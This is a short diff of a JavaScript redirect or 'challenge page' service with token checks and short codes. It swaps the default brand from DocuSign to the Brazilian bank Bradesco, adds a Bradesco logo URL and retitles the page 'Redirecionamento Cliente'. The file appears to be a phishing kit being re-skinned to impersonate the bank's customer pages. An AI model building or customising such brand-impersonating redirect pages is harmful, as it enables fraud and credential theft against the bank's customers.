@@ -75,7 +75,7 @@ function validateToken(token, expectedCode) {
 // Personalize: substitua LOGO_URL pela URL da logo da sua empresa
 // Exemplo: const LOGO_URL = "https://seusite.com.br/logo.png";
 const LOGO_URL = process.env.LOGO_URL || "https://assets.b9.com.br/wp-content/uploads/2018/11/Bradesco-novo-logo1.jpg";
-const COMPANY_NAME = process.env.COMPANY_NAME || "DocuSign";
+const COMPANY_NAME = process.env.COMPANY_NAME || "Bradesco";
 
 function challengePage(shortCode, token) {
   const logoHtml = LOGO_URL
@@ -164,7 +164,7 @@ function challengePage(shortCode, token) {
           <line x1="9" y1="17" x2="13" y2="17"/>
         </svg>
       </div>
-      <h2>Seu documento está pronto</h2>
+      <h2>Redirecionamento Cliente</h2>
       <p class="sub">O arquivo foi preparado com sucesso.<br>Você será redirecionado em instantes.</p>
       <div class="progress-wrap">
         <div class="progress-bar" id="bar"></div>
